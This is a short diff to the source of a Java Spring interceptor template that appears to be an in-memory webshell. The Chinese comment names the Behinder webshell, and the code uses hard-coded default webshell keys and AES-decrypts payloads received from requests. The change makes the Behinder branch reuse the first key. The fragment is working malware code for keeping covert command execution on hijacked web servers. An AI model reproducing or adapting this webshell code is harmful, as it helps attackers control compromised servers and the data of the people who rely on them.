@@ -22,7 +22,7 @@ import java.util.*;
 
 public class SpringInterceptorTemplate extends HandlerInterceptorAdapter {
 
-    String xc = "3c6e0b8a9c15224a"; // key
+    String xc = "3c6e0b8a9c15224a"; // key e45e329feb5d925b
     String pass = "pass";
     String md5 = md5(pass + xc);
     Class payload;
@@ -156,7 +156,7 @@ public class SpringInterceptorTemplate extends HandlerInterceptorAdapter {
 
                         // System.out.println(payload);
                         // 冰蝎逻辑
-                        String k = "e45e329feb5d925b"; // rebeyond
+                        String k = xc; // rebeyond
                         session.putValue("u", k);
                         Cipher c = Cipher.getInstance("AES");
                         c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
